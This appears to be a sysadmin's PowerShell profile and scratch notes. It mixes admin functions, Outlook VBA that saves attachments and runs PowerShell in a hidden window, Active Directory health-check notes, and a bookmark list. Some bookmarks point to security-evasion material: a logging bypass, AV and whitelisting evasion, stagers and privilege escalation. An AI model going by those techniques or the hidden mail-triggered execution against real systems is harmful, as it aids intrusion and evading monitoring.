    $getFolder = $fso.getFolder( $folder.fullname.tostring() )
    if (!$getFolder.Size) { #for "special folders" like appdata
      $lengthSum = gci $folder.FullName -recurse -force -ea silentlyContinue | `
        measure -sum length -ea SilentlyContinue | select -expand sum
      $sizeMBs = "{0:N0}" -f ($lengthSum /1mb)
    } #close if size property is null
      else { $sizeMBs = "{0:N0}" -f ($getFolder.size /1mb) }
      #else {$sizeMBs = [int]($getFolder.size /1mb) }
    New-Object -TypeName psobject -Property @{
       name = $getFolder.path;
      sizeMB = $sizeMBs
    } #close new obj property
  } #close foreach folder
  #here's the output
  $folders | sort @{E={[decimal]$_.sizeMB}} -Descending | ? {[decimal]$_.sizeMB -gt $SizeMB} | ft -auto
  #calculate the total including contents
  $sum = $folders | select -expand sizeMB | measure -sum | select -expand sum
  $sum += ( gci -file $path | measure -property length -sum | select -expand sum ) / 1mb
  $sumString = "{0:n2}" -f ($sum /1kb)
  $sumString + " GB total"
} #end function
set-alias gfs Get-FolderSizes

function get-drivespace {
  param( [parameter(mandatory=$true)]$Computer)
  if ($computer -like "*.com") {$cred = get-credential; $qry = Get-WmiObject Win32_LogicalDisk -filter drivetype=3 -comp $computer -credential $cred }
  else { $qry = Get-WmiObject Win32_LogicalDisk -filter drivetype=3 -comp $computer }
  $qry | select `
    @{n="drive"; e={$_.deviceID}}, `
    @{n="GB Free"; e={"{0:N2}" -f ($_.freespace / 1gb)}}, `
    @{n="TotalGB"; e={"{0:N0}" -f ($_.size / 1gb)}}, `
    @{n="FreePct"; e={"{0:P0}" -f ($_.FreeSpace / $_.size)}}, `
    @{n="name"; e={$_.volumeName}} |
  format-table -autosize
} #close drivespace

function New-URLfile {
  param( [parameter(mandatory=$true)]$Target, [parameter(mandatory=$true)]$Link )
  if ($target -match "^\." -or $link -match "^\.") {"Full paths plz."; break}
  $content = @()
  $header = '[InternetShortcut]'
  $content += $header
  $content += "URL=" + $target
  $content | out-file $link
  ii $link
} #end function

function New-LNKFile {
  param( [parameter(mandatory=$true)]$Target, [parameter(mandatory=$true)]$Link )
  if ($target -match "^\." -or $link -match "^\.") {"Full paths plz."; break}
  $WshShell = New-Object -comObject WScript.Shell
  $Shortcut = $WshShell.CreateShortcut($link)
  $Shortcut.TargetPath = $target
  $shortCut.save()
} #end function new-lnkfile

<#
Poor man's grep? For searching large txt files.
function Search-TextFile {
  param(
    [parameter(mandatory=$true)]$File,
    [parameter(mandatory=$true)]$SearchText
  ) #close param
  if ( !(test-path $File) ) {"File not found:" + $File; break}
  $fullPath = resolve-path $file | select -expand path
  $lines = [system.io.file]::ReadLines($fullPath)
  foreach ($line in $lines) { if ($line -match $SearchText) {$line} }
} #end function Search-TextFile

Lists programs installed on a remote computer.
function Get-InstalledProgram { [cmdletBinding()] #http://blogs.technet.com/b/heyscriptingguy/archive/2011/11/13/use-powershell-to-quickly-find-installed-software.aspx
      param( [parameter(mandatory=$true)]$Comp,[parameter(mandatory=$false)]$Name )
      $keys = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall','SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
      TRY { $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Comp) }
      CATCH {
        $rrSvc = gwmi win32_service -comp $comp -Filter {name='RemoteRegistry'}
        if (!$rrSvc) {"Unable to connect. Make sure that this computer is on the network, has remote administration enabled, `nand that both computers are running the remote registry service."; break}
        #Enable and start RemoteRegistry service
        if ($rrSvc.State -ne 'Running') {
          if ($rrSvc.StartMode -eq 'Disabled') { $null = $rrSvc.ChangeStartMode('Manual'); $undoMe2 = $true }
          $null = $rrSvc.StartService() ; $undoMe = $true
        } #close if rrsvc not running
          else {"Unable to connect. Make sure that this computer is on the network, has remote administration enabled, `nand that both computers are running the remote registry service."; break}
        $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Comp)
      } #close if failed to connect regbase
      $out = @()
      foreach ($key in $keys) {
         if ( $RegBase.OpenSubKey($Key) ) { #avoids errors on 32bit OS
          foreach ( $entry in $RegBase.OpenSubKey($Key).GetSubkeyNames() ) {
            $sub = $RegBase.OpenSubKey( ($key + '\' + $entry) )
            if ($sub) { $row = $null
              $row = [pscustomobject]@{
                Name = $RegBase.OpenSubKey( ($key + '\' + $entry) ).GetValue('DisplayName')
                InstallDate = $RegBase.OpenSubKey( ($key + '\' + $entry) ).GetValue('InstallDate')
                Version = $RegBase.OpenSubKey( ($key + '\' + $entry) ).GetValue('DisplayVersion')
              } #close row
              $out += $row
            } #close if sub
          } #close foreach entry
        } #close if key exists
      } #close foreach key
      $out | where {$_.name -and $_.name -match $Name}
      if ($undoMe) { $null = $rrSvc.StopService() }
      if ($undoMe2) { $null = $rrSvc.ChangeStartMode('Disabled') }
    } #end function

#==============================================================================
function IIS-startover {
    iisreset /restart
    iisreset /stop

    rm "C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files\*.*" -recurse -force -Verbose

    iisreset /start
}
#==============================================================================

$str = 'param([string]$name,[string]$template)'
$ast = [System.Management.Automation.Language.Parser]::ParseInput($str, [ref]$null, [ref]$null)
$ast.ParamBlock.Parameters.Name.Extent.Text
$name
$template

#==============================================================================
#==============================================================================
#==============================================================================
#==============================================================================
#==============================================================================
#==============================================================================
https://www.simple-talk.com/sysadmin/powershell/how-to-document-your-powershell-library/

http://www.powershellmagazine.com/2013/12/23/simplifying-data-manipulation-in-powershell-with-lambda-functions/

http://www.makeuseof.com/tag/windows-gets-package-manager-download-software-centrally-via-oneget/

wmI remote exec cmd.exe https://gallery.technet.microsoft.com/scriptcenter/56962f03-0243-4c83-8cdd-88c37898ccc4
https://blogs.technet.microsoft.com/heyscriptingguy/2012/01/02/find-the-top-ten-scripts-submitted-to-the-script-repository/
Engineering Efficiency: Scripts, Tools, and Software News in the IT World  http://blog.richprescott.com/
Client System Administration tool (v1.0.2)

http://alexfalkowski.blogspot.com/2012/08/functionalprogramming-in-powershell.html
https://github.com/alexfalkowski/documentation/commit/73e0581d313e27fa6e88b04fe5b2a5c101283c78

https://github.com/manojlds/pslinq

https://en.wikiversity.org/wiki/Windows_PowerShell/Functions

Get-WMIobject win32_networkadapterconfiguration | where {$_.IPEnabled -eq $True} | 
  Select-Object @{N='ComputerName'; E={$_.pscomputername}},
                @{N='Name';         E={$_.Description}},
                @{N='Index';        E={$_.InterFaceIndex}},
                @{N='IPAddress';    E={$_.ipaddress -join ','}},
                @{N='Router';       E={$_.defaultipgateway}},
                @{N='Subnet';       E={$_.IPSubNet}},
                @{N='DNSServer';    E={$_.DNSServerSearchOrder -join ','}},
                @{N='WinsServer';   E={$_.winsprimaryserver -join ','}}
                #@{N='';        E={$_.}},
                #@{N='';        E={$_.}},

MACAddress
GatewayCostMetric
Get-WMIobject win32_networkadapterconfiguration | where {$_.IPEnabled -eq $True} | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table -Auto
Get-AdDomainController -Filter * | Select hostname,isglobalcatalog | Format-table -auto
Search-ADAccount -PasswordNeverExpires | Select-Object Name, Enabled 
cls;while($true){get-date;$t = New-Object Net.Sockets.TcpClient;try {$t.connect("10.45.2.68",3389);write-host "RDP is up"}catch{write-Host "RDP is down"}finally{$t.close();sleep 30}}
cls;$idxA = (get-eventlog -LogName Application -Newest 1).Index;while($true){$idxA2 = (Get-EventLog -LogName Application -newest 1).index;get-eventlog -logname Application -newest ($idxA2 - $idxA) |  sort index;$idxA = $idxA2;sleep 10}
Gwmi Win32_Share|%{"\\$($_|% P*e)\$($_.Name)"}
https://github.com/PowerShell/Phosphor 
[boolean](whoami /all | sls S-1-5-32-544)  # Admin?
gwmi win32_logonsession | % { $_.GetRelated('Win32_UserAccount') } | % {$_} | ft

http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file
https://github.com/tomasr/dotfiles/blob/master/.profile.ps1
https://github.com/tomasr/dotfiles
https://github.com/adjohnson916/PowerShell-profile
https://github.com/adjohnson916/PowerShell-profile/blob/master/Microsoft.PowerShell_profile.ps1
https://github.com/pagebrooks/PowerShell-Profile/blob/master/Microsoft.PowerShell_profile.ps1
https://github.com/bdukes/PowerShell-Profile
https://gist.github.com/i-e-b/1767387
https://github.com/frigus02/powershell-profile
https://github.com/frigus02/powershell-profile/commit/245994257f52325e1072ab2e78394f4dbfac9145
https://github.com/spmason/powershell-profile
https://github.com/keithbloom/powershell-profile
https://github.com/DeadlyBrad42/Powershell-Profile
https://github.com/scottmuc/poshfiles
https://gist.github.com/cloudRoutine/87c17655405cd8b1eac7
https://github.com/spmason/powershell-profile/blob/master/profile.ps1
https://github.com/BretFisher/PowerShell-Profile/blob/master/Microsoft.PowerShell_profile.ps1

http://benherman.com/ftp/PowerShellFunctions.ps1

http://www.mikefal.net/scripts/Powershell_tips_tricks.ps1


function Reduce($initial, $sb) {
  begin { $result = $initial }
  process {
    $result = & $sb $result $_
  }
  end { $result }
}

$sb = { param($x, $y) $x + $y }

1..5 | Reduce 0 $sb
Update 9/9/2014: Although, conveniently, the ForEach-Object takes a Begin and End block.
PS> 1..5 | % { $result = 0 } { $result += $_ } { $result } # % is an alias for ForEach-Object
15



filter num2x { $_ -replace "\d","x" }
Get-Content test.txt | num2x | add-content new.txt


Excel VBA to PowerShell:
Sub DisplayWorkbookPath()
  Dim FullName, Command, Directory, Script As String
  Directory = ActiveWorkbook.Path
  FullName = Directory & "\" & "Testbook.xlsx" ' ActiveWorkbook.Name
  Script = Directory & "\" & "New-PartsListTest.ps1"
  Dim Result
  'Command = "cmd /k EchoArgs.exe -Noexit -NoProfile -File " & Script & " -Wait 2 -path '" & FullName & "'"
  'Result = Shell(Command, 1)
  Command = "PowerShell -Noexit -NoProfile -File " & Script & " -Wait 2 -path '" & FullName & "'"
  Result = Shell(Command, 1)
  MsgBox Command, vbInformation, "Workbook Path"
End Sub

Sub CreatePartsList()
  Dim FullName, Command, Directory, Script As String
  Directory = ActiveWorkbook.Path
  FullName = Directory & "\" & ActiveWorkbook.Name
  '  WORKT CASE you replace all the SPACES or weird characters with encoding  Advant0X20Workbook
  Script = Directory & "\" & "New-PartsList.ps1"
  Dim Result
  'Command = "cmd /k EchoArgs.exe -Noexit -NoProfile -File " & Script & " -Wait 2 -path '" & FullName & "'"
  'Result = Shell(Command, 1)
  Command = "PowerShell -Noexit -NoProfile -File " & Script & " -Wait 2 -path '" & FullName & "'"
  Result = Shell(Command, 1)
  MsgBox Command, vbInformation, "Workbook Path"
End Sub


Outlook VBA to PowerShell call Convert-Bigfix.ps1
Private WithEvents myOlItems  As Outlook.Items

Private Sub Application_Startup()
  Dim olApp As Outlook.Application
  Dim objNS As Outlook.NameSpace
  Set olApp = Outlook.Application
  Set objNS = olApp.GetNamespace("MAPI")
  Set myOlItems = objNS.GetDefaultFolder(olFolderInbox).Items
End Sub

Private Function NeedToSaveAttachment(ByVal Sender As String, ByVal Subject As String) As Boolean
  ' From: BigFix.Reports@dcs.state.tx.us
  '   All Servers in BigFix report-397.csv
  '   Windows Servers Report Notification report-478.csv
  ' From: SevOne Mailer <SevOneReports-ITO@atos.net>
  '   SevOne Report - Daily ICMP and SNMP Status  "Device List.csv"
  Dim Senders(2) As String
  'MsgBox "Sender:[" & Sender & "] Subject:[" & Subject & "]"
  Senders(0) = "BigFix.Reports@dcs.state.tx.us"
  Senders(1) = "SevOne Mailer" 'SevOne Mailer <SevOneReports-ITO@atos.net>
  Dim Subjects(3) As String
  Subjects(0) = "All Servers in BigFix"                       ' report-397.csv
  Subjects(1) = "Windows Servers Report Notification"         ' "report-478.csv"
  Subjects(2) = "SevOne Report - Daily ICMP and SNMP Status"  ' "Device List.csv"
  Dim FilteredSender, FilteredSubject As Variant
  Dim FoundSender, FoundSubject As Boolean
  FilteredSender = Filter(Senders, Sender)
  FilteredSubject = Filter(Subjects, Subject)
  FoundSender = UBound(FilteredSender) >= 0
  FoundSubject = UBound(FilteredSubject) >= 0
  NeedToSaveAttachment = FoundSender And FoundSubject
End Function
Private Sub TestFound()
  Dim Found As Boolean
  If NeedToSaveAttachment("BigFix.Reports@dcs.state.tx.us", "All Servers in BigFix") Then
    MsgBox ("TestFound")
  Else
    MsgBox ("Not found")
  End If
End Sub
' https://stackoverflow.com/questions/8005713/using-vba-to-read-new-outlook-email
' Save Attachments Slipstick https://www.slipstick.com/developer/save-attachments-to-the-hard-drive/
' Diane Poremsky book?
Public Function SaveItemAttachments(ByVal objMsg As Object) As String
  Dim objAttachments  As Outlook.Attachments
  Dim i               As Long
  Dim lngCount        As Long
  Dim strFile         As String
  Dim strFolderpath   As String
  Dim Attachments     As String
  SaveItemAttachments = Attachments = ""
  strFolderpath = CreateObject("WScript.Shell").SpecialFolders(16) ' Get path to Documents folder
  Set objAttachments = objMsg.Attachments
  lngCount = objAttachments.Count
  If lngCount > 0 Then
    Dim Collect() As String
    ReDim Collect(lngCount - 1)
    For i = lngCount To 1 Step -1                    ' Count DOWN to avoid problems removing items
      strFile = objAttachments.Item(i).FileName
      strFile = strFolderpath & "\" & strFile        ' Combine with the path to the Temp folder.
      'MsgBox "Saving: " & strFile
      objAttachments.Item(i).SaveAsFile strFile      ' Save the attachment as a file.
      Collect(i - 1) = "'" & strFile & " '"
      Attachments = Join(Collect, ",")
    Next i
  End If
  'MsgBox ("Attachments: " & Attachments)
  SaveItemAttachments = Attachments
ExitSub:
  Set objAttachments = Nothing
End Function

Private Sub myOlItems_ItemAdd(ByVal Item As Object)
  On Error GoTo ErrorHandler
  If TypeName(Item) = "MailItem" Then
    Dim MessageItem As Outlook.MailItem 'Object
    Set MessageItem = Item
    Dim ShellCommand, PSCommand, Subject, FromName, FromEmail, Files As String
    'Dim From as
    Subject = MessageItem.Subject
    'From = MessageItem.Sender
    FromEmail = MessageItem.SenderEmailAddress        ' SenderEmailName Sender
    FromName = MessageItem.SenderName        ' SenderEmailName
    If (NeedToSaveAttachment(FromName, Subject)) Then
      'From = " '" & From & "'"
      'FromEmail = " '" & FromEmail & "'"        ' SenderEmailName Sender
      FromName = " '" & FromName & "'"        ' SenderEmailName
      Subject = " '" & Subject & "'"
      'MsgBox "Calling SaveItemAttachments"
      Files = SaveItemAttachments(MessageItem)
      MessageItem.UnRead = False
      MessageItem.Save
      'PSCommand = "&{ echoargs (get-date -f 's')" & Subject & FromName & " " & Files & " cde } >> c:\dev\vbalog.txt"
      'PSCommand = "&{ echoargs (get-date -f 's')" & Subject & From & FromName & FromEmail & " cde } >> c:\dev\vbalog.txt"
      PSCommand = "C:\Bat\Convert-BigFix.ps1 " & Files
      'PSCommand = "'EchoArgs.exe' " & Files & " >> $home\documents\echoargs.txt"
      ShellCommand = "powershell -nologo -noprofile -WindowStyle hidden -command " & PSCommand
      'MsgBox ("[" & ShellCommand & "]")
      RetVal = Shell(ShellCommand, 0)
      'MsgBox ("RetVal: " & RetVal)
    End If
  End If
ProgramExit:
  Exit Sub
ErrorHandler:
  MsgBox Err.Number & " - " & Err.Description
  Resume ProgramExit
End Sub
Private Sub Application_NewMail()
    ' Specifying 1 as the second argument opens the application in
    ' normal size and gives it the focus.
    Dim RetVal
    'RetVal = Shell("powershell -nologo -noprofile -WindowStyle hidden -command &{echoargs (get-date -f 's') b c} >> c:\dev\vbalog.txt", 0)
End Sub

Public Sub SaveAttachments()
  Dim objOL           As Outlook.Application
  Dim objMsg          As Outlook.MailItem 'Object
  Dim objSelection    As Outlook.Selection
  Dim Files As String
  On Error Resume Next
  Set objOL = CreateObject("Outlook.Application")      ' Instantiate an Outlook Application object.
  Set objSelection = objOL.ActiveExplorer.Selection    ' Get the collection of selected objects.
  For Each objMsg In objSelection                      ' Check for attachments.
    Files = SaveItemAttachments(objMsg)
    PSCommand = "C:\Bat\Convert-BigFix.ps1 " & Files
    PSCommand = "'EchoArgs.exe' " & Files & " >> $home\documents\echoargs.txt"
    ShellCommand = "powershell -nologo -noprofile -WindowStyle hidden -command " & PSCommand
    Subject = objMsg.Subject
    FromName = objMsg.SenderName        ' SenderEmailName
    'If NeedToSaveAttachment(FromName, Subject) Then
    '  FromName = " '" & FromName & "'"        ' SenderEmailName
    '  Subject = " '" & Subject & "'"
    '  PSCommand = "C:\Bat\Convert-BigFix.ps1 " & Files
    '  ShellCommand = "powershell -nologo -noprofile -WindowStyle hidden -command " & PSCommand
    '  RetVal = Shell(ShellCommand, 0)
    'End If
    objMsg.UnRead = False
    objMsg.Save
    'MsgBox ("[" & ShellCommand & "]")
    'MsgBox (Files)
  Next
ExitSub:
  Set objMsg = Nothing
  Set objSelection = Nothing
  Set objOL = Nothing
End Sub


Public Sub SaveAttachmentsSave()
  Dim objOL           As Outlook.Application
  Dim objMsg          As Outlook.MailItem 'Object
  Dim objAttachments  As Outlook.Attachments
  Dim objSelection    As Outlook.Selection
  Dim i               As Long
  Dim lngCount        As Long
  Dim strFile         As String
  Dim strFolderpath   As String
  Dim strDeletedFiles As String
  strFolderpath = CreateObject("WScript.Shell").SpecialFolders(16) ' Get path to Documents folder
  'strFolderpath = "C:\users\A469526\Documents\" ' Get path to Documents folder
  On Error Resume Next
  Set objOL = CreateObject("Outlook.Application")      ' Instantiate an Outlook Application object.
  Set objSelection = objOL.ActiveExplorer.Selection    ' Get the collection of selected objects.
  ' strFolderpath = strFolderpath & "\OLAttachments\"  ' folder must exist
  For Each objMsg In objSelection                      ' Check for attachments.
    Set objAttachments = objMsg.Attachments
    lngCount = objAttachments.Count
    If lngCount > 0 Then
      For i = lngCount To 1 Step -1                    ' Count DOWN to avoid problems removing items
        strFile = objAttachments.Item(i).FileName
        strFile = strFolderpath & "\" & strFile        ' Combine with the path to the Temp folder.
        'MsgBox "Saving: " & strFile
        objAttachments.Item(i).SaveAsFile strFile      ' Save the attachment as a file.
      Next i
    End If
  Next
ExitSub:
  Set objAttachments = Nothing
  Set objMsg = Nothing
  Set objSelection = Nothing
  Set objOL = Nothing
End Sub

$Interface = [ordered]@{}; 
netsh interface IPv4 show address | Where-Object { $_.trim() } | ForEach-Object { 
  If ($_ -match '^Config.*"(.*)"') { 
    '{0,-16} {1}' -f 'Name', $Matches[1] 
  } else { 
    $Fields = $_ -replace '(mask)?[)\s]+' -split '[:(/]'; 
    If ($Fields.Count -eq 2) { 
      '{0,-16} {1}' -f $Fields[0],$Fields[1] 
    } ElseIf ($Fields.Count -eq 4) { 
      '{0,-16} {1}' -f 'Subnet',     $Fields[1]; 
      '{0,-16} {1}' -f 'CIDR',       $Fields[2];
      '{0,-16} {1}' -f 'SubNetMask', $Fields[3] 
    }
  }  
}


Windows 10 Security Technical Implementation Guide
Security Technical Implementation Guides (STIGs) that provides a methodology for standardized secure installation and maintenance of DOD IA and IA-enabled devices and systems.
https://www.stigviewer.com/stig/windows_10/
OSD vs GPO vs Provisioning Packs (if any). 
https://github.com/iadgov/Secure-Host-Baseline
GitHub iadgov/Secure-Host-Baseline
Secure-Host-Baseline - Configuration guidance for implementing the Windows 10 and Windows Server 2016 DoD Secure Host Baseline settings. iadgov
https://github.com/iadgov/Secure-Host-Baseline

Active Directory Troubleshooting ?Znote dcdiag repadmin summary
https://activedirectorypro.com/dcdiag-check-domain-controller-health/
    Dcdiag: How to Check Domain Controller Health
    https://support.microsoft.com/en-us/help/2512643/dcdiag-exe-e-or-a-or-c-expected-errors
    To stop the RPCSS service error, you can opt out of the test with /SKIP:SERVICES. There are caveats to this, see More Information.It is better to simply ignore this specific error altogether when it is returned from Win2003 DCs.
    All of these behaviors are expected.

The Windows Server 2008/200R2 versions of DCDIAG are designed to test RPCSS for the Windows Server 2008 shared process setting -not the previous isolated process setting used in Windows Server 2003 and older operating systems. The tool does not distinguish between OSs for this service.
The Windows Server 2008/200R2 versions of DCDIAG assume that a Windows Server 2008 domain functional level means the DCs are replicating SYSVOL with DFSR.
The Windows Server 2008/200R2 versions of DCDIAG does not correctly test trust health
Windows Server 2008/2008 R2 does not allow remote connectivity to the event log based on default firewall rules.
The Windows Server 2003 version of DCDIAG does not report back an error if it cannot connect to the event log; it only reports if it connects and finds errors.
The Windows Server 2003 version of DCDIAG does not test the RPCSS service configuration.
Resolution
There are multiple workarounds to these issues:

Ignore all these errors when running DCDIAG.
To stop the event log-related errors, enable the built-in incoming firewall rules on DCs so that the event logs can be accessed remotely:
    DCDIAG.EXE /E or /A or /C expected errors
    How do I use the DCDiag tool to check a domain controller configuration?
    https://www.petri.com/check-domain-controller-configuration-with-dcdiag
    http://www.computerperformance.co.uk/w2k3/utilities/windows_dcdiag.htm
    take a full and a system state backup using a supported backup system as documented in the TechNet article below
http://technet.microsoft.com/en-us/library/cc731188(WS.10).aspx
    https://blogs.technet.microsoft.com/ptsblog/2011/11/14/performing-an-active-directory-health-check-before-upgrading/
    Active Directory and Active Directory Domain Services Port Requirements
    http://technet.microsoft.com/en-us/library/dd772723(WS.10).aspx
    ADRAP or RAP as a service.
    You can check this script;
https://gallery.technet.microsoft.com/scriptcenter/Active-Directory-Health-709336cd
and also these commands&tool;
ad replication tool ; https://www.microsoft.com/en-us/download/details.aspx?id=30005
What does DCDIAG actually… do?  http://blogs.technet.com/b/askds/archive/2011/03/22/what-does-dcdiag-actually-do.aspx
Active Directory Health Checks for Domain Controllers  http://msmvps.com/blogs/ad/archive/2008/06/03/active-directory-health-checks-for-domain-controllers.aspx
    . DCDiag /Test:DNS
Besides replication, the other most common cause of Active Directory failure is DNS
    Note that the Source DC list shows outbound replication and the Destination DC list shows inbound. For example, in the top list, WTEC-DC2 is a Source DC and it hasn't replicated for more than five days. This is outbound replication because WTEC-DC2 is the source when the error is reported. 
    Repadmin and Replsum
Repadmin, as a rule, is the most powerful command-line tool for Active Directory troubleshooting. The Replication Summary option, or Replsum command, displays an overview of the replication status of all DCs in all domains in the forest
    https://redmondmag.com/Articles/2012/07/01/5-Free-Microsoft-Tools-for-Top-Active-Directory-Health.aspx?m=1&Page=2
    Active Directory Best Practices Analyzer 
With the Active Directory Best Practices Analyzer (ADBPA) tool provided by Microsoft in Windows Server 2008 R2
    Active Directory health assessment or troubleshooting effort. It's a free download from bit.ly/LGivyL
    https://redmondmag.com/articles/2012/07/01/5-free-microsoft-tools-for-top-active-directory-health.aspx?m=1

#>

$PSDefaultParameterValues['Get-ChildItem:Force']         = $True  
$PSDefaultParameterValues['Get-Process:IncludeUserName'] = $True
# Install-UpdatedModule  Newer Modules Later Versions
$Modules = Get-Module -ListAvailable | Group Name | ForEach-Object {
  $_.Group | Sort Version -Descending | Select-Object -First 1
}
$Gallery   = Find-Module
$Available = @{};
$Gallery | ForEach-Object { $Available."$($_.Name)" = $_.Version }
$Newer = $Modules | Where-Object {
  $Have = $_.Name
  $Available.Contains($Have) -and $Available[$Have] -gt $_.Version
} | ForEach-Object {
  [PSCustomObject]@{
    Name      = $Have
    Version   = $_.Version
    Available = $Available[$Have]
  }
}
$Newer | % { 
  $_ 
  Install-Module -Name $_.Name  -Force -AllowClobber -Confirm:$False -ea Ignore 
} | Format-Table


Hacking the Human Operating System  -- Downloaded PDF 
Cyber attackers often bypass the consciousness of their targets and attempt to manipulate victims through subconscious influences. This report from Intel Security offers advice on how to mitigate these risks.

BookMarks and/or History from Phone 2018-14-08 
Google
http://www.google.com/
Mobile Web
http://smart.myvzw.com/
Insider's Guide
http://www.verizonwireless.com/insiders-guide/
DSC Data Science Search Engine - Data Science Central
https://www.datasciencecentral.com/page/search?q=in+one+picture
Cheatsheets – RStudio
https://www.rstudio.com/resources/cheatsheets/
31 Must Know Keyboard Shortcuts for Web Browsers - Ridicurious
https://ridicurious.com/2015/03/23/31-must-know-keyboard-shortcuts-for-web-browsers/
PowerShell and Design Patterns | Researching the optimal; implementing the practical
https://dfinke.github.io/powershell,%20design%20patterns/2018/04/13/PowerShell-And-Design-Patterns.html?utm_content=buffer00216&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer
Your Guide to Master Hypothesis Testing in Statistics - Data Science Central
https://www.datasciencecentral.com/profiles/blogs/your-guide-to-master-hypothesis-testing-in-statistics?utm_content=buffer597a9&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer
ScriptBlock Logging Bypass
https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407
sc0tfree | Real-World Rubber Ducky Attacks with Empire Stagers
https://www.sc0tfree.com/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers
Alternative methods of becoming SYSTEM
https://blog.xpnsec.com/becoming-system/amp/?__twitter_impression=true
Reverse Engineering – martin.uy
http://martin.uy/blog/projects/reverse-engineering/
YouTube
https://m.youtube.com/watch?reload=9&v=FvGndkpa4K0
Introducing Event Query Language | Endgame
https://www.endgame.com/blog/technical-blog/introducing-event-query-language
Introducing Git protocol version 2 | Google Open Source Blog
https://opensource.googleblog.com/2018/05/introducing-git-protocol-version-2.html?m=1
Revoke-Obfuscation: PowerShell Obfuscation Detection Framework • Penetration Testing
https://securityonline.info/revoke-obfuscation-powershell-obfuscation-detection-framework/
5 Free Security Tools You Likely Haven't Heard Of (But Should Install)
https://www.makeuseof.com/tag/unknown-free-security-tools/
Upgrading shells to fully interactive TTYs
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
A Design of the Command-line Suggestion Infrastructure · Issue #123 · PowerShell/PowerShell-RFC
https://github.com/PowerShell/PowerShell-RFC/pull/123
recon-points.txt
https://gist.github.com/ehsahil/7a047f38e22e167cbed85aa703639c1f
Recon— my way. – SecurityEscape – Medium
https://medium.com/securityescape/recon-my-way-82b7e5f62e21
Which Anti-Poverty Policies Work? by Bjørn Lomborg - Project Syndicate
https://www.project-syndicate.org/commentary/microcredit-debt-waivers-weak-poverty-relief-by-bjorn-lomborg-2018-06
The Git Rebase Introduction I Wish I'd Had
https://dev.to/maxwell_dev/the-git-rebase-introduction-i-wish-id-had
GitHub - Gallopsled/pwntools: CTF framework and exploit development library
https://github.com/Gallopsled/pwntools
The File Google has on You Is 10 Times Bigger Than Facebook's
http://theantimedia.com/google-10-times-data/#comments
Blue Team fundamentals Part Two: Windows Processes.
https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2
AIRNow - Austin, TX Air Quality
https://airnow.gov/index.cfm?action=airnow.local_city&cityid=229
2018 Blog Income Report Research Study by The Blog Millionaire - BrandonGaille.com
https://brandongaille.com/blog-income-report-study/
Twitter Shadowban Test
https://shadowban.eu/
Blue Team fundamentals Part Two: Windows Processes.
https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2?gi=7ffdecb42dc8
Modifying Metasploit x64 template for AV evasion - Black Hills Information Security
https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/
Predicate Pushdown and why should I care? – MSSQL Tiger Team
https://blogs.msdn.microsoft.com/sql_server_team/predicate-pushdown-and-why-should-i-care/
Reverse Engineering – martin.uy
https://martin.uy/blog/projects/reverse-engineering/
Watch How-To Training for Technology Professionals for Free
https://www.techsnips.io/
Introducing Merlin — A cross-platform post-exploitation HTTP/2 Command & Control Tool
https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a
10 ways to prevent, detect and recover from ransomware and zeroday threats | CSO Online
https://www.csoonline.com/article/3287099/ransomware/10-ways-to-prevent-detect-and-recover-from-ransomware-and-zeroday-threats.html
Radiolab | Radiolab Presents: Gonads | WNYC Studios
https://www.wnycstudios.org/shows/radiolab/projects/radiolab-presents-gonads/
Counseling - Bullies2Buddies
https://bullies2buddies.com/what-we-do/counseling-2/
How to delete your past tweets — in bulk and for free — and save your career from your past self
https://medium.freecodecamp.org/how-to-delete-your-past-tweets-in-bulk-and-for-free-save-yourself-from-your-past-self-f8844cdbda2
Creating Universal Dashboard Components - Part 1 - PoshTools
https://poshtools.com/2018/07/21/creating-universal-dashboard-components-part-1/
How to Bypass Application Whitelisting & AV - Black Hills Information Security
https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/
Powershell Without Powershell - How To Bypass Application Whitelisting, Environment Restrictions & AV - Black Hills Information Security
https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/
PowerShell : Fancy Test-Connection - Ridicurious
https://ridicurious.com/2015/07/16/powershell-fancy-test-connection/
Google's Grand Plan To Make AI Accessible To Developers And Businesses
https://www.forbes.com/sites/janakirammsv/2018/07/28/googles-grand-plan-to-make-ai-accessible-to-developers-and-businesses/amp/?__twitter_impression=true
The Self-Taught Data Scientist Curriculum - Data Mania
http://www.data-mania.com/blog/self-taught-data-scientist-curriculum/
How to write PowerShell for speed – 4sysops
https://4sysops.com/archives/how-to-write-powershell-for-speed/
ScriptBlock Logging Bypass · GitHub
https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407
Advanced Threat Tactics – Course and Notes | Strategic Cyber LLC
https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes/
A Design of the Command-line Suggestion Infrastructure · Issue #123 · PowerShell/PowerShell-RFC · GitHub
https://github.com/PowerShell/PowerShell-RFC/pull/123
GitHub - adbertram/Automate-The-Boring-Stuff-With-PowerShell
https://github.com/adbertram/Automate-The-Boring-Stuff-With-PowerShell
Draft of Microsoft Security Servicing Commitments for Windows – Security Research & Defense
https://blogs.technet.microsoft.com/srd/2018/06/12/draft-of-microsoft-security-servicing-commitments-for-windows/
ehsahil’s gists · GitHub
https://gist.github.com/ehsahil
Mini Post: 20 More Pulseway Alerts with PowerShell
https://king.geek.nz/2015/07/03/more-alerts/amp/?__twitter_impression=true
Malware Types Explained - Hacking Tutorials
